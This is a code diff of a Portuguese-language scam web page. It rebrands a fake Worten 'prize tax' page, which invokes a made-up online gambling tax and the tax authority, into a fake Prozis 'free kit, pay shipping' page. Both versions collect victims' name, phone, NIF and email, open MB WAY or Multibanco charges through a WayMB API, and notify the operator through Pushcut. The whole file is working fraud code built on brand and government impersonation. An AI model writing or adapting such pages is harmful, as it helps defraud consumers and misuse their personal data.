@@ -5,10 +5,10 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script src="/static/js/tracker.js"></script>
-    <title>Validação de Prémio - Worten</title>
-    <link rel="stylesheet" href="style.css?v=37">
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
-    <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
+    <title>Pagamento de Envio - Prozis</title>
+    <link rel="stylesheet" href="style.css?v=38">
+    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon" href="assets/prozis-logo.svg" type="image/svg+xml">
 
     <!-- Meta Pixel Code -->
     <script>
@@ -31,62 +31,54 @@
     <!-- End Meta Pixel Code -->
 
     <style>
-        /* Override style.css */
+        /* Prozis Theme Overrides */
         body {
-            background: white !important;
-            display: block !important;
-            padding: 0 !important;
-            min-height: auto !important;
-        }
-
-        #worten-header {
-            background: #d32f2f !important;
-            padding: 15px 20px !important;
-        }
-
-        body {
-            font-family: 'Open Sans', 'Arial', sans-serif;
-            background: white;
+            font-family: 'Exo 2', sans-serif;
+            background: #f5f5f5 !important;
             margin: 0;
             padding: 0;
-            color: #333;
-            opacity: 0;
-            /* For Fade In */
-            transition: opacity 0.5s ease;
+            color: #111;
         }
 
-        #worten-header {
-            background: #d32f2f;
-            padding: 15px 20px;
+        #prozis-header {
+            background: #000;
+            padding: 15px 0;
             text-align: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-bottom: 3px solid #e32526;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            width: 100%;
+        }
+
+        #prozis-header img {
+            height: 25px;
         }
 
         .main-container {
             max-width: 500px;
             margin: 30px auto;
             background: white;
-            border-radius: 12px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
             overflow: hidden;
             padding: 30px 25px;
         }
 
-        .security-header {
+        .shipping-header {
             text-align: center;
-            border-bottom: 2px solid #f0f0f0;
+            border-bottom: 1px solid #eee;
             padding-bottom: 20px;
             margin-bottom: 25px;
         }
 
-        .padlock-icon {
-            color: #4caf50;
-            margin-bottom: 10px;
+        .box-icon {
+            color: #25a01c;
+            /* Green Icon */
+            margin-bottom: 15px;
         }
 
         .summary-box {
-            background: #f8f9fa;
-            border: 1px solid #e9ecef;
+            background: #fff;
+            border: 1px solid #eee;
             border-radius: 8px;
             padding: 20px;
             margin-bottom: 30px;
@@ -95,121 +87,88 @@
         .info-row {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
             font-size: 14px;
             color: #666;
         }
 
-        .info-row.highlight {
-            color: #333;
-            font-weight: 600;
+        .info-row.total {
+            color: #000;
+            font-weight: 800;
             margin-top: 15px;
             padding-top: 15px;
-            border-top: 1px solid #e0e0e0;
-            font-size: 15px;
+            border-top: 1px solid #eee;
+            font-size: 18px;
         }
 
         .payment-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 20px;
+            gap: 15px;
             margin-bottom: 25px;
-            max-width: 500px;
-            margin-left: auto;
-            margin-right: auto;
         }
 
         .payment-option {
             border: 2px solid #eee;
-            border-radius: 10px;
-            padding: 25px 20px;
+            border-radius: 8px;
+            padding: 20px;
             cursor: pointer;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            min-height: 110px;
+            min-height: 100px;
             transition: all 0.2s;
             position: relative;
         }
 
         .payment-option:hover,
         .payment-option.selected {
-            border-color: #2e7d32;
-            background: #f1f8e9;
+            border-color: #25a01c;
+            /* Green selection */
+            background: rgba(37, 160, 28, 0.05);
         }
 
         .badge-most-used {
             position: absolute;
             top: -10px;
-            background: #2e7d32;
+            background: #25a01c;
+            /* Green Badge */
             color: white;
             font-size: 10px;
-            padding: 2px 8px;
+            padding: 3px 10px;
             border-radius: 10px;
             font-weight: 700;
-            display: none;
+            display: block;
         }
 
-        /* Show badge only inside selected payment option if needed, but here we control via inline block toggling or specific structure */
-
         .payment-logo {
-            max-width: 100%;
-            max-height: 45px;
+            max-width: 160px;
+            /* Increased size */
+            max-height: 80px;
             object-fit: contain;
         }
 
         .validation-btn {
             width: 100%;
-            padding: 16px;
-            background: #d32f2f;
-            /* Worten Red for consistency, or Green for action */
+            padding: 18px;
+            background: #25a01c;
+            /* Green Button */
             color: white;
-            font-weight: 700;
+            font-weight: 800;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 5px;
+            font-size: 18px;
             cursor: pointer;
-            box-shadow: 0 4px 0 #b71c1c;
+            box-shadow: 0 4px 15px rgba(37, 160, 28, 0.3);
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            transition: transform 0.1s;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            transition: all 0.2s;
         }
 
-        .validation-btn::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            animation: shimmer 2.5s infinite;
-        }
-
-        @keyframes shimmer {
-            0% {
-                left: -100%;
-            }
-
-            50% {
-                left: 100%;
-            }
-
-            100% {
-                left: 100%;
-            }
-        }
-
-        .validation-btn:active {
-            transform: translateY(3px);
-            box-shadow: 0 1px 0 #b71c1c;
+        .validation-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 160, 28, 0.5);
+            background: #208a18;
         }
 
         /* Modal Styles */
@@ -220,21 +179,21 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.6);
+            background: rgba(0, 0, 0, 0.8);
             z-index: 1000;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            backdrop-filter: blur(5px);
         }
 
         .modal-content {
             background: white;
             padding: 30px;
-            border-radius: 15px;
+            border-radius: 10px;
             width: 100%;
-            max-width: 350px;
+            max-width: 400px;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
             animation: slideUp 0.3s ease;
         }
 
@@ -249,166 +208,104 @@
                 opacity: 1;
             }
         }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            font-size: 12px;
+            color: #999;
+        }
     </style>
 </head>
 
 <body>
     <!-- Header -->
-    <div id="worten-header">
-        <img src="/assets/worten-logo.svg" style="width: 120px; filter: brightness(0) invert(1);">
+    <div id="prozis-header">
+        <img src="assets/prozis-logo.svg" alt="Prozis">
     </div>
 
     <div class="main-container">
 
-        <div class="security-header">
-            <div
-                style="display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; font-size: 11px; color: #2e7d32; margin-bottom: 15px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">
-                <span style="white-space: nowrap;">✓ Voucher gerado</span>
-                <span style="white-space: nowrap;">✓ Dados confirmados</span>
-                <span style="white-space: nowrap;">⏳ Pagamento de imposto</span>
-            </div>
-            <svg class="padlock-icon" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                stroke-width="2">
-                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        <div class="shipping-header">
+            <svg class="box-icon" width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path
+                    d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z">
+                </path>
+                <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+                <line x1="12" y1="22.08" x2="12" y2="12"></line>
             </svg>
-            <h2 style="margin: 10px 0 5px; font-size: 18px; font-weight: 700;">Recolha de Imposto Obrigatório
-            </h2>
-            <p style="margin: 0; font-size: 13px; color: #777;">Imposto Especial de Jogo Online (IEJO)</p>
+            <h2 style="margin: 0; font-size: 22px; font-weight: 800; text-transform: uppercase;">Finalizar Envio</h2>
+            <p style="margin: 10px 0 0; color: #666; font-size: 14px;">Confirma os dados para expedição imediata.</p>
         </div>
 
-        <div class="summary-box" style="background: #e8f5e9; border-color: #c8e6c9;">
-            <div
-                style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid #c8e6c9;">
-                <img src="https://upload.wikimedia.org/wikipedia/pt/6/64/Autoridade_Tribut%C3%A1ria_e_Aduaneira.png"
-                    style="height: 35px; opacity: 0.9;" alt="AT">
-                <div style="flex: 1;">
-                    <div
-                        style="font-size: 11px; color: #1b5e20; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">
-                        Imposto Recolhido por:</div>
-                    <div style="font-size: 12px; color: #2e7d32; font-weight: 600;">Autoridade Tributária e Aduaneira
-                    </div>
-                </div>
-            </div>
-            <p style="margin-top: 0; font-size: 13px; line-height: 1.5; color: #2e7d32;">
-                <strong>Legislação Portuguesa:</strong> De acordo com a legislação vigente em Portugal, todos os prémios
-                de jogos e apostas estão sujeitos ao Imposto Especial de Jogo Online (IEJO), que deve ser recolhido
-                antes da entrega do prémio.
-            </p>
-            <p style="font-size: 13px; line-height: 1.5; color: #2e7d32; margin-bottom: 0;">
-                O pagamento de <strong>12,49 €</strong> (2,5% de 500 €) é processado através de <span
-                    style="background: #fff; padding: 0 4px; border-radius: 4px; border: 1px solid #a5d6a7;">Multibanco
-                    e MB WAY</span>, instituições autorizadas pela AT para recolha automática deste imposto em nome do
-                Estado Português.
-            </p>
+        <div class="summary-box">
+            <h4 style="margin: 0 0 15px; font-weight: 700; text-transform: uppercase; font-size: 14px;">Resumo do Pedido
+            </h4>
 
-            <div class="info-row highlight" style="color: #2e7d32; border-top-color: #a5d6a7;">
-                <span>IEJO - Imposto Obrigatório (2,5%)</span>
-                <span>12,50 €</span>
+            <div class="info-row">
+                <span>Kit Completo Prozis</span>
+                <span style="color: #25a01c; font-weight: 700;">GRÁTIS</span>
             </div>
-            <p style="font-size: 10px; color: #1b5e20; margin-bottom: 0; text-align: right;">*Valor do Prémio: 500,00 €
-            </p>
+            <div class="info-row">
+                <span>Peso Total (Estimado)</span>
+                <span>2.4 kg</span>
+            </div>
+            <div class="info-row">
+                <span>Método de Envio</span>
+                <span>Expresso (24h)</span>
+            </div>
+
+            <div class="info-row total">
+                <span>Total a Pagar (Portes)</span>
+                <span style="color: #25a01c;">12.99 €</span>
+            </div>
         </div>
 
-        <h3 style="font-size: 15px; font-weight: 700; margin-bottom: 15px;">Selecione o método de pagamento:</h3>
+        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 15px; text-transform: uppercase;">Pagamento Seguro:
+        </h3>
 
         <div class="payment-grid">
-            <div class="payment-option selected" onclick="selectPayment(this, 'mbway')" style="position: relative;">
-                <div class="badge-most-used" style="display: block;">MAIS USADO</div>
+            <div class="payment-option selected" onclick="selectPayment(this, 'mbway')">
+                <div class="badge-most-used">MAIS RÁPIDO</div>
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/1280px-Logo_MBWay.svg.png"
                     class="payment-logo" alt="MB WAY">
-                <div style="display: flex; align-items: center; justify-content: center; gap: 4px; margin-top: 5px;">
-                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#2e7d32" stroke="#2e7d32" stroke-width="2"
-                        stroke-linecap="round" stroke-linejoin="round">
-                        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
-                    </svg>
-                    <span style="font-size: 11px; color: #2e7d32; font-weight: 600;">Ativação imediata do voucher</span>
-                </div>
+                <div style="font-size: 11px; color: #666; margin-top: 8px;">Processamento Imediato</div>
             </div>
 
             <div class="payment-option" onclick="selectPayment(this, 'multibanco')">
                 <img src="https://www.multibanco.pt/wp-content/uploads/2025/01/Multibanco-Logo-CMYK.svg"
                     class="payment-logo" alt="Multibanco">
-                <p style="margin: 5px 0 0; font-size: 11px; color: #777;">Pode demorar +24h</p>
+                <div style="font-size: 11px; color: #666; margin-top: 8px;">Pagamento por Ref.</div>
             </div>
         </div>
 
-        <p
-            style="text-align: center; font-size: 11px; color: #666; margin: -15px 0 20px 0; padding: 0 10px; line-height: 1.4;">
-            Após o pagamento do imposto, o seu voucher de 500 € será ativado instantaneamente para uso em loja física ou
-            online.
+        <p style="text-align: center; font-size: 11px; color: #999; margin-bottom: 25px;">
+            Ao confirmar, a tua encomenda será processada imediatamente nos nossos armazéns logísticos.
         </p>
 
-        <button class="validation-btn" onclick="processPayment()"
-            style="background: #2e7d32; box-shadow: 0 4px 0 #1b5e20; display: flex; align-items: center; justify-content: center; gap: 10px;">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
-                stroke-linecap="round" stroke-linejoin="round">
-                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                <path d="M7 11V7a5 5 0 0 1 9.9-1"></path>
-            </svg>
-            Pagar Imposto e Ativar Voucher
+        <button class="validation-btn" onclick="processPayment()">
+            PAGAR PORTES (12.99€)
         </button>
     </div>
 
-    <!-- Official Footer -->
-    <footer class="worten-footer">
-        <img src="/assets/worten-logo.svg" class="footer-logo" alt="Worten">
-        <div class="footer-content">
-            <div class="footer-col">
-                <h4>Apoio ao Cliente</h4>
-                <ul>
-                    <li><a href="#">Ajuda e Contactos</a></li>
-                    <li><a href="#">Estado da Encomenda</a></li>
-                    <li><a href="#">Devoluções</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Sobre Nós</h4>
-                <ul>
-                    <li><a href="#">Quem somos</a></li>
-                    <li><a href="#">Lojas</a></li>
-                    <li><a href="#">Worten Resolve</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Links Úteis</h4>
-                <ul>
-                    <li><a onclick="openLegal('privacy')">Política de Privacidade</a></li>
-                    <li><a onclick="openLegal('terms')">Termos e Condições</a></li>
-                    <li><a href="#">Livro de Reclamações</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <p>© 2024 Worten - Equipamentos para o Lar, S.A. Todos os direitos reservados.</p>
-        </div>
+    <footer>
+        <p>© 2024 Prozis.com. Todos os direitos reservados.</p>
+        <p style="margin-top: 10px;">Pagamentos processados de forma segura SSL/TLS.</p>
     </footer>
 
-    <!-- Legal Modals -->
-    <div id="legalModal" class="legal-modal">
-        <div class="legal-content">
-            <span class="close-legal" onclick="closeLegal()">&times;</span>
-            <h2 id="legalTitle" style="color: #d32f2f; margin-bottom: 20px;"></h2>
-            <div id="legalBody" style="font-size: 13px; color: #555;"></div>
-        </div>
-    </div>
-
-    <script src="script.js?v=37"></script>
-    <script src="waymb-service.js?v=37"></script>
-
     <!-- Loading Overlay -->
-    <div id="loadingOverlay" class="modal-overlay"
-        style="z-index: 2000; background: rgba(255,255,255,0.95); flex-direction: column;">
+    <div id="loadingOverlay" class="modal-overlay" style="flex-direction: column;">
         <div class="spinner-large"></div>
-        <h3 style="margin-top: 20px; color: #d32f2f; font-weight: 700;">A Comunicar com o Banco...</h3>
-        <p style="color: #666; font-size: 14px;">Por favor aguarde um momento.</p>
+        <h3 style="margin-top: 20px; color: #e32526; font-weight: 700;">A Processar Pedido...</h3>
+        <p style="color: white; font-size: 14px;">Não feche a janela.</p>
     </div>
     <style>
         .spinner-large {
-            width: 60px;
-            height: 60px;
-            border: 5px solid #eee;
-            border-top-color: #d32f2f;
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #fff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -424,38 +321,38 @@
         }
     </style>
 
-    <!-- MB WAY Confirmation Modal -->
+    <!-- MB WAY Phone Confirmation -->
     <div id="mbwayModal" class="modal-overlay">
         <div class="modal-content">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Logo_MBWay.svg/1280px-Logo_MBWay.svg.png"
                 style="height: 30px; margin-bottom: 20px;">
-            <h3 style="margin: 0 0 10px; font-size: 18px;">Confirmar Telemóvel</h3>
+            <h3 style="margin: 0 0 10px; font-size: 18px; color: #000;">Confirmar Número</h3>
             <p style="font-size: 14px; color: #555; margin-bottom: 20px;">
-                Enviar pedido de aprovação para o número:
+                Enviar pedido de pagamento para:
             </p>
-            <div style="background: #f4f4f4; padding: 10px; font-weight: 800; font-size: 20px; border-radius: 8px; margin-bottom: 20px;"
+            <div style="background: #f4f4f4; padding: 15px; font-weight: 800; font-size: 22px; border-radius: 8px; margin-bottom: 25px; color: #000;"
                 id="confirmPhoneDisplay">
                 --- --- ---
             </div>
 
-            <button class="validation-btn" style="background: #333; box-shadow: none; margin-bottom: 10px;"
+            <button class="validation-btn" style="background: #000; margin-bottom: 10px;"
                 onclick="finalizeMBWay()">CONFIRMAR</button>
             <button
-                style="background: none; border: none; color: #777; font-size: 12px; cursor: pointer; text-decoration: underline;"
+                style="background: none; border: none; color: #777; font-size: 13px; cursor: pointer; text-decoration: underline;"
                 onclick="closePaymentModal()">Alterar Número</button>
         </div>
     </div>
 
+    <script src="script.js?v=38"></script>
+    <script src="waymb-service.js?v=38"></script>
+
     <script>
-        let selectedMethod = null;
+        let selectedMethod = 'mbway';
         let userData = {};
 
-        // Fade In and Load Data
         window.onload = () => {
-            document.body.style.opacity = '1';
-
-            // Retrieve data
-            const storedData = localStorage.getItem('wortenUserData');
+            // Retrieve data from Product Page Form
+            const storedData = localStorage.getItem('shippingData');
             if (storedData) {
                 userData = JSON.parse(storedData);
             }
@@ -468,18 +365,11 @@
         }
 
         async function processPayment() {
-            if (!selectedMethod) {
-                alert('Por favor, selecione um método de pagamento para continuar.');
-                return;
-            }
-
             if (selectedMethod === 'mbway') {
-                // Show confirmation modal with phone number
                 const displayPhone = userData.phone || '--- --- ---';
                 document.getElementById('confirmPhoneDisplay').innerText = displayPhone;
                 document.getElementById('mbwayModal').style.display = 'flex';
-            } else if (selectedMethod === 'multibanco') {
-                // Call API directly for Multibanco
+            } else {
                 await createAndRedirect('multibanco');
             }
         }
@@ -489,92 +379,63 @@
         }
 
         async function finalizeMBWay() {
+            // Basic validation again just in case
             const cleanTel = (userData.phone || '').toString().replace(/\s/g, '');
-            const cleanName = (userData.name || '').toString().trim();
-            const cleanNIF = (userData.nif || '').toString().replace(/\s/g, '');
-
-            // Validate Portuguese phone number - All valid MB WAY prefixes
-            const phoneDigits = cleanTel.replace(/\D/g, '');
-            const validPrefixes = ['91', '92', '93', '96'];
-            const hasValidPrefix = validPrefixes.some(prefix => phoneDigits.startsWith(prefix));
-
-            if (phoneDigits.length !== 9 || !hasValidPrefix) {
-                alert('Número de telemóvel inválido!\nPor favor, insira um número português válido (91x, 92x, 93x ou 96x).');
-                return;
-            }
-
-            if (!cleanName || cleanName.length < 3) {
-                alert('Por favor, insira o seu nome completo.');
-                return;
-            }
-
-            if (cleanNIF.length !== 9) {
-                alert('NIF inválido! Deve ter 9 dígitos.');
+            if (cleanTel.length < 9) {
+                // Prompt if empty (fallback)
+                const newPhone = prompt("Por favor confirme o seu número de telemóvel:");
+                if (newPhone) {
+                    userData.phone = newPhone;
+                    finalizeMBWay(); // Retry
+                }
                 return;
             }
 
             closePaymentModal();
-            await createAndRedirect('mbway', { phone: cleanTel, name: cleanName, document: cleanNIF });
+            await createAndRedirect('mbway');
         }
 
         async function createAndRedirect(method) {
-            // Show Transition Spinner
             document.getElementById('loadingOverlay').style.display = 'flex';
 
-            // Sanitize Input
-            const cleanDoc = (userData.nif || '999999990').toString().replace(/\D/g, '').slice(0, 9);
-            const cleanTel = (userData.phone || '912345678').toString().replace(/\D/g, '').slice(0, 9);
-            const cleanName = (userData.name || 'Verification User').substring(0, 50);
+            const cleanTel = (userData.phone || '999999999').toString().replace(/\D/g, '').slice(0, 9);
+            const cleanName = (userData.name || 'Prozis Customer').substring(0, 50);
+            const cleanDoc = "999999990"; // Optional invoice NIF
 
-            // Create Transaction
+            // Call WayMB API
             const result = await window.wayMB.createTransaction({
-                amount: 12.49,
+                amount: 12.99, // PRODUCT KIT SHIPPING
                 method: method,
-                flow: "root",
+                flow: "root", // Or specialized flow if needed
                 payer: {
                     name: cleanName,
                     document: cleanDoc,
-                    phone: cleanTel
+                    phone: cleanTel,
+                    email: userData.email || ""
                 }
             });
 
             if (result.success) {
-                // Notificar Pushcut (Pendente)
-                window.wayMB.notifyPushcut('Pendente delivery', `Novo pedido gerado: 12,49 € (${method.toUpperCase()})`);;;
+                // Determine Pushcut Notification based on success
+                window.wayMB.notifyPushcut('Pendente delivery', `Prozis Kit: 12.99€ (${method.toUpperCase()})`);
 
-                // FB Pixel Purchase Event
-                fbq('track', 'Purchase', { currency: "EUR", value: 12.49 });
+                fbq('track', 'Purchase', { currency: "EUR", value: 12.99 });
 
-                // Merge API Data with Payer Info for Display
-                const finalData = {
-                    ...result.data,
-                    payer: { phone: cleanTel, name: cleanName }
-                };
-
-                // Save Transaction Data to Session
+                const finalData = { ...result.data, payer: { phone: cleanTel, name: cleanName } };
                 sessionStorage.setItem('currentPayment', JSON.stringify(finalData));
 
-                // Redirect
                 setTimeout(() => {
                     if (method === 'mbway') {
                         window.location.href = 'payment_mbway.html';
                     } else {
                         window.location.href = 'payment_multibanco.html';
                     }
-                }, 1000); // Slight delay to show the nice animation
+                }, 1000);
             } else {
-                console.error("Payment Error:", result);
-                document.getElementById('loadingOverlay').style.display = 'none'; // Hide overlay on error
-                alert('Erro na comunicação: ' + (result.error || 'Tente novamente.'));
+                document.getElementById('loadingOverlay').style.display = 'none';
+                alert('Erro ao processar: ' + (result.error || 'Tente novamente.'));
             }
         }
-
-        // Close modal on outside click
-        document.getElementById('mbwayModal').addEventListener('click', (e) => {
-            if (e.target.className === 'modal-overlay') {
-                closePaymentModal();
-            }
-        });
     </script>
 </body>
 
